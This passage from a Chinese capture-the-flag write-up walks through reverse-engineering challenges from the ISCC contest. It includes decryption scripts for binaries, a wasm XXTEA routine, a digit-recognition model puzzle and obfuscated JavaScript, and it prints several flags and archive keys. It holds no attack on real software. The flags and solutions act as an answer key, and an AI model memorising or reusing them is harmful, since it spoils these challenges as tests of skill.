class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cmp)):</span><br><span class="line">    cmp[i] -= <span class="number">10</span></span><br><span class="line">    cmp[i] &amp;= <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cmp) - <span class="number">1</span>):</span><br><span class="line">    cmp[i] += cmp[i + <span class="number">1</span>]</span><br><span class="line">    cmp[i] &amp;= <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cmp) - <span class="number">1</span>):</span><br><span class="line">    cmp[i] ^= <span class="built_in">ord</span>(key2[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cmp), <span class="number">2</span>):</span><br><span class="line">    cmp[i] ^= <span class="built_in">ord</span>(key2[i % <span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cmp) // <span class="number">2</span>):</span><br><span class="line">    cmp[i], cmp[<span class="number">26</span> - i - <span class="number">1</span>] = cmp[<span class="number">26</span> - i - <span class="number">1</span>], cmp[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cmp) // <span class="number">2</span>):</span><br><span class="line">    cmp[i], cmp[<span class="number">26</span> - i - <span class="number">1</span>] = cmp[<span class="number">26</span> - i - <span class="number">1</span>], cmp[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cmp)):</span><br><span class="line">    cmp[i] += <span class="built_in">ord</span>(key2[i % <span class="number">4</span>])</span><br><span class="line">    cmp[i] &amp;= <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(cmp))</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc7945a29.png" alt="image-20240503003247400"></p>
<p>ISCC{Wi]@z’{‘,W&#x3D;g&amp;Lo&gt;9wY8}</p>
<h4 id="WinterBegins"><a href="#WinterBegins" class="headerlink" title="WinterBegins"></a>WinterBegins</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc786e968.png" alt="image-20240508213206897"></p>
<p>给了个exe文件</p>
<p>研究一下</p>
<p>直接上脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">table=<span class="string">&quot;冻笔新诗懒写寒炉美酒时温醉看墨花月白恍疑雪满前村&quot;</span></span><br><span class="line">tmp=<span class="built_in">open</span>(<span class="string">r&quot;E:\QQsavefile\winterbegins (1).exe&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()[<span class="number">0x1c98d</span>:<span class="number">0x1c98d</span>+<span class="number">2</span>*<span class="number">140</span>].decode(<span class="string">&#x27;gbk&#x27;</span>,errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">enc=tmp[:tmp.index(<span class="string">&#x27;\x00&#x27;</span>)]</span><br><span class="line">enc=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#x27;</span>.join(enc[i+<span class="number">1</span>:i-<span class="number">1</span>:-<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">2</span>)])</span><br><span class="line">tmp=[table.find(i)//<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> enc[<span class="number">0</span>::<span class="number">2</span>]]</span><br><span class="line">it=<span class="built_in">iter</span>(tmp)</span><br><span class="line">listchar=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> it:</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">11</span>:</span><br><span class="line">        listchar.append(<span class="built_in">chr</span>(<span class="built_in">next</span>(it)+<span class="number">61</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        listchar.append(<span class="built_in">chr</span>(i+<span class="number">48</span>))</span><br><span class="line">tmpflag=<span class="built_in">list</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> x:<span class="built_in">chr</span>(<span class="built_in">int</span>(x,<span class="number">16</span>)),<span class="built_in">map</span>(<span class="keyword">lambda</span> x,y:x+y,listchar[::<span class="number">2</span>],listchar[<span class="number">1</span>::<span class="number">2</span>]))))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(tmpflag))</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">sum</span>([ i-<span class="number">1</span>  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tmpflag)) <span class="keyword">if</span> tmpflag[i] <span class="keyword">in</span> string.digits])&gt;<span class="number">0</span>:</span><br><span class="line">    index=[ i-<span class="number">1</span>  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tmpflag)) <span class="keyword">if</span> tmpflag[i] <span class="keyword">in</span> string.digits][<span class="number">0</span>]</span><br><span class="line">    tmpflag=tmpflag[:index]+[tmpflag[index]]*<span class="built_in">int</span>(tmpflag[index+<span class="number">1</span>])+tmpflag[index+<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(tmpflag))</span><br></pre></td></tr></table></figure>



<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc79acc18.png" alt="image-20240508213723635"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc786a677.png" alt="image-20240508213731153"></p>
<h4 id="Find-All"><a href="#Find-All" class="headerlink" title="Find_All"></a>Find_All</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc7848929.png" alt="image-20240508214222003"></p>
<p>两个文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc7826cc0.png" alt="image-20240508214335542"></p>
<p>7z要密码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc79303d1.png" alt="image-20240508214441198"></p>
<p>IDA打开看下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc7998b6c.png" alt="image-20240508215227259"></p>
<p>tap</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc79af9f4.png" alt="image-20240508215257526"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66420378a79ed.png" alt="image-20240513201135922"></p>
<p>直接跑python脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v4 = [get_wide_byte(0x00401625 + i * 7) for i in range(24)]</span><br><span class="line">for i in range(0, len(v4) - 1, 4):</span><br><span class="line">    v4[i + 2] ^= v4[i + 3]</span><br><span class="line">    v4[i + 1] ^= v4[i + 2]</span><br><span class="line">    v4[i] ^= v4[i + 1]</span><br><span class="line">print(bytes(v4).decode())</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66420383ec1f2.png" alt="image-20240513201147452"></p>
<h4 id="I-am-the-Mathematician"><a href="#I-am-the-Mathematician" class="headerlink" title="I_am_the_Mathematician"></a>I_am_the_Mathematician</h4><p>使用前 20 个斐波那契数作为索引，从code_book中提取字符得到flag</p>
<p>跑脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fib</span>(<span class="params">n</span>):</span><br><span class="line">     a,b = <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">     lis = []</span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">         a,b =b,a+b</span><br><span class="line">         lis.append(a)</span><br><span class="line">     <span class="keyword">return</span> lis</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>([i <span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(os.getcwd()) <span class="keyword">if</span> i.startswith(<span class="string">&quot;code_book&quot;</span>)][<span class="number">0</span>],<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">     data = file.read()</span><br><span class="line">     file.close()</span><br><span class="line"></span><br><span class="line">target = fib(<span class="number">20</span>)</span><br><span class="line"><span class="keyword">assert</span> target[-<span class="number">1</span>] &gt; <span class="built_in">len</span>(data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;ISCC&#123;&#123;<span class="subst">&#123;<span class="string">&#x27;&#x27;</span>.join([data[i - <span class="number">1</span>] <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(data) <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span></span></span></span><br><span class="line"><span class="subst"><span class="string">target])&#125;</span>&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6642279a2826c.png" alt="image-20240513224545389"></p>
<h4 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h4><p>两个文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc782cd46.png" alt="image-20240520221032476"></p>
<p>直接跑脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pip install torch</span></span><br><span class="line"><span class="comment"># pip install -i https://pypi.tuna.tsinghua.edu.cn/simple torchvision</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_7zname = <span class="string">&#x27;AI-20.7z&#x27;</span>    <span class="comment"># 替换你的路径</span></span><br><span class="line">offset_str = <span class="string">&#x27;123456789012345678901234&#x27;</span></span><br><span class="line">target_base64 = <span class="string">&#x27;TWF/c1sse19GMW5gYVRoWWFrZ3lhd0B9&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">encrypted_base64, offset_str</span>):</span><br><span class="line">    encrypted_bytes = base64.b64decode(encrypted_base64.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    encrypted_str = encrypted_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    decrypted = []</span><br><span class="line">    <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(encrypted_str):</span><br><span class="line">        offset = <span class="built_in">int</span>(offset_str[i])</span><br><span class="line">        ascii_val = <span class="built_in">ord</span>(char) ^ offset</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            original_ascii = ascii_val - offset</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            original_ascii = ascii_val + offset</span><br><span class="line">        decrypted_char = <span class="built_in">chr</span>(original_ascii)</span><br><span class="line">        decrypted.append(decrypted_char)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(decrypted)</span><br><span class="line"></span><br><span class="line">key = decrypt(target_base64, offset_str)</span><br><span class="line"></span><br><span class="line"><span class="comment"># # Key&#123;Y0u_F1nd_The_key_w@&#125;</span></span><br><span class="line"><span class="keyword">import</span> py7zr</span><br><span class="line"><span class="keyword">with</span> py7zr.SevenZipFile(_7zname, mode=<span class="string">&#x27;r&#x27;</span>, password=key) <span class="keyword">as</span> z:</span><br><span class="line">    z.extractall()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> torch  <span class="comment"># torch基础库</span></span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn  <span class="comment"># torch神经网络库</span></span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">import</span> torchvision.transforms <span class="keyword">as</span> transforms  <span class="comment"># 图像处理库</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image  <span class="comment"># 图像处理库</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Net</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(Net, self).__init__()</span><br><span class="line">        self.fc1 = nn.Linear(<span class="number">28</span> * <span class="number">28</span>, <span class="number">128</span>)</span><br><span class="line">        self.fc2 = nn.Linear(<span class="number">128</span>, <span class="number">64</span>)</span><br><span class="line">        self.fc3 = nn.Linear(<span class="number">64</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = x.view(-<span class="number">1</span>, <span class="number">28</span> * <span class="number">28</span>)</span><br><span class="line">        x = F.relu(self.fc1(x))</span><br><span class="line">        x = F.relu(self.fc2(x))</span><br><span class="line">        x = self.fc3(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">model = torch.load(<span class="string">&quot;confused_digit_recognition_model.pt&quot;</span>)</span><br><span class="line">model.<span class="built_in">eval</span>()</span><br><span class="line"></span><br><span class="line">transform = transforms.Compose(</span><br><span class="line">    [</span><br><span class="line">        transforms.Grayscale(num_output_channels=<span class="number">1</span>),</span><br><span class="line">        transforms.Resize((<span class="number">28</span>, <span class="number">28</span>)),</span><br><span class="line">        transforms.ToTensor(),</span><br><span class="line">        transforms.Normalize((<span class="number">0.5</span>,), (<span class="number">0.5</span>,)),</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line">dic = &#123;</span><br><span class="line">    <span class="string">&quot;0&quot;</span>: <span class="string">&quot;@nd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;1&quot;</span>: <span class="string">&quot;a!&quot;</span>,</span><br><span class="line">    <span class="string">&quot;2&quot;</span>: <span class="string">&quot;_&quot;</span>,</span><br><span class="line">    <span class="string">&quot;3&quot;</span>: <span class="string">&quot;F&quot;</span>,</span><br><span class="line">    <span class="string">&quot;4&quot;</span>: <span class="string">&quot;SSS&quot;</span>,</span><br><span class="line">    <span class="string">&quot;5&quot;</span>: <span class="string">&quot;W@&quot;</span>,</span><br><span class="line">    <span class="string">&quot;6&quot;</span>: <span class="string">&quot;K&quot;</span>,</span><br><span class="line">    <span class="string">&quot;7&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;8&quot;</span>: <span class="string">&quot;C&quot;</span>,</span><br><span class="line">    <span class="string">&quot;9&quot;</span>: <span class="string">&quot;d&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    image = Image.<span class="built_in">open</span>(<span class="built_in">str</span>(i + <span class="number">1</span>) + <span class="string">&quot;.png&quot;</span>)</span><br><span class="line">    image = transform(image).unsqueeze(<span class="number">0</span>)  <span class="comment"># type:ignore</span></span><br><span class="line">    output = model(image)</span><br><span class="line">    predicted = torch.argmax(output, dim=<span class="number">1</span>)</span><br><span class="line">    flag.append(predicted.item())</span><br><span class="line">flag = <span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, flag))</span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> dic.items():</span><br><span class="line">    flag = flag.replace(k, v)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="Which-is-the-flag"><a href="#Which-is-the-flag" class="headerlink" title="Which_is_the_flag"></a>Which_is_the_flag</h4><p>IDA打开后</p>
<p>直接IDA跑python脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">your_hex_string = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(get_wide_byte(<span class="number">0x14000BF40</span>+i) ^ <span class="number">0xc</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>)])</span><br><span class="line">bytes_object = <span class="built_in">bytes</span>(<span class="built_in">bytearray</span>.fromhex(your_hex_string))</span><br><span class="line"></span><br><span class="line">decoded_string = base64.b64decode(bytes_object).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ISCC&#123;&quot;</span> + decoded_string + <span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>



<h3 id="擂台题-1"><a href="#擂台题-1" class="headerlink" title="擂台题"></a>擂台题</h3><h4 id="火眼金睛"><a href="#火眼金睛" class="headerlink" title="火眼金睛"></a>火眼金睛</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc7847ea7.png" alt="image-20240520223802751"></p>
<p>base64解密</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc79a9fc0.png" alt="image-20240520223839786"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//zfhagkhauak116arws13fasa6rtaafsfaAEShafxnvSA5glwiy8hf193751387905hwewtknfyf255hdf85u5rheyas7frfq3i526u4jrt486agax164saty611R4G3NDa2sdg//U2FsdGVkX18vC9NASfvLBkp9ZZ2D5JpAWTclbgW/tuBqs9Y0O4bw/GTv9amPiZkM</span><br></pre></td></tr></table></figure>

<p>aes 加密</p>
<p>得：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">U2FsdGVkX18vC9NASfvLBkp9ZZ2D5JpAWTclbgW/tuBqs9Y0O4bw/GTv9amPiZkM</span><br></pre></td></tr></table></figure>

<p>再aes解密：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc78a83ce.png" alt="image-20240520224347554"></p>
<h4 id="W2w"><a href="#W2w" class="headerlink" title="W2w"></a>W2w</h4><p>用 wabt 的工具将 wasm 文件转为 asm 文和.c 文件；</p>
<p>编译出 test.o 文件</p>
<p>使用 IDA 打开；W2c_f6 函数发现 XXTEA 加密特征；查看调用可以看见 w2c_f8 函数对加密后的数据再 xor 了一个 0xFF</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc79a15c4.png" alt="image-20240525145237457"></p>
<p>asm 文件中寻找密文和 key ， 提取出的密文长度和加密时候的一致key为 <code>0xdeedbeef ,0xbeefdeed, 0, 1</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc79a44e3.png" alt="image-20240525145351506"></p>
<p>所以：</p>
<p>exp：</p>
<p>BTEA加密和解密</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x61C88647</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Mix function for the btea algorithm</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z &gt;&gt; 5 ^ y <span class="string">&lt;&lt; 2) + (y &gt;</span>&gt; 3 ^ z &lt;&lt; 6)) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e]) ^ z))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Tea block encryption/decryption function</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">btea</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">int</span> n, <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) &#123; <span class="comment">// Encryption</span></span><br><span class="line">        <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">        <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">        </span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n - <span class="number">1</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; ++p) &#123;</span><br><span class="line">                y = v[p + <span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>) &#123; <span class="comment">// Decryption</span></span><br><span class="line">        n = -n;</span><br><span class="line">        <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">        <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">        </span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        sum = rounds * -DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; --p) &#123;</span><br><span class="line">                z = v[p - <span class="number">1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n - <span class="number">1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc[] = &#123;</span><br><span class="line">        <span class="number">21</span>,<span class="number">196</span>,<span class="number">46</span>,<span class="number">178</span>,<span class="number">244</span>,<span class="number">130</span>,<span class="number">147</span>,<span class="number">215</span>,<span class="number">136</span>,<span class="number">221</span>,<span class="number">180</span>,<span class="number">253</span>,<span class="number">8</span>,<span class="number">156</span>,<span class="number">156</span>,<span class="number">82</span>,</span><br><span class="line">        <span class="number">130</span>,<span class="number">120</span>,<span class="number">134</span>,<span class="number">58</span>,<span class="number">226</span>,<span class="number">60</span>,<span class="number">62</span>,<span class="number">185</span>,<span class="number">198</span>,<span class="number">115</span>,<span class="number">103</span>,<span class="number">89</span>,<span class="number">141</span>,<span class="number">166</span>,<span class="number">224</span>,<span class="number">65</span>,</span><br><span class="line">        <span class="number">87</span>,<span class="number">166</span>,<span class="number">158</span>,<span class="number">196</span>,<span class="number">31</span>,<span class="number">92</span>,<span class="number">132</span>,<span class="number">117</span>,<span class="number">202</span>,<span class="number">61</span>,<span class="number">42</span>,<span class="number">152</span>,<span class="number">150</span>,<span class="number">46</span>,<span class="number">250</span>,<span class="number">43</span>,<span class="number">93</span>,</span><br><span class="line">        <span class="number">137</span>,<span class="number">53</span>,<span class="number">44</span>,<span class="number">177</span>,<span class="number">131</span>,<span class="number">88</span>,<span class="number">90</span>,<span class="number">129</span>,<span class="number">206</span>,<span class="number">211</span>,<span class="number">180</span>,<span class="number">130</span>,<span class="number">76</span>,<span class="number">226</span>,<span class="number">93</span></span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="type">uint32_t</span>* p = (<span class="type">uint32_t</span>*)enc;</span><br><span class="line">    <span class="type">uint32_t</span> key[<span class="number">4</span>] = &#123; <span class="number">0xDEADBEEF</span>, <span class="number">0xBEEFDEED</span>, <span class="number">0</span>, <span class="number">1</span> &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// XOR each element with 0xFF before decryption</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; ++i) &#123;</span><br><span class="line">        enc[i] ^= <span class="number">0xFF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Perform decryption</span></span><br><span class="line">    btea(p, <span class="number">-16</span>, key);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Print decrypted string (assuming it&#x27;s null-terminated or safe to print as such)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, (<span class="type">char</span>*)enc);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h4 id="ezjs"><a href="#ezjs" class="headerlink" title="ezjs"></a>ezjs</h4><p>简单混淆</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc795f518.png" alt="image-20240525152649641"></p>
<p>每次从数组里面拿个数</p>
<p>运算</p>
<p>把满足条件的加入到输出数组</p>
<p>输入数组的每个元素都会对应输出数组的n个元素，属于映射关系，直接爆破即可</p>
<p>直接手动爆破</p>
<p>1112746894</p>
<p>所以</p>
<p>ISCC{1112746894}</p>
<h4 id="Ezobf"><a href="#Ezobf" class="headerlink" title="Ezobf"></a>Ezobf</h4><p>打开研究一些</p>
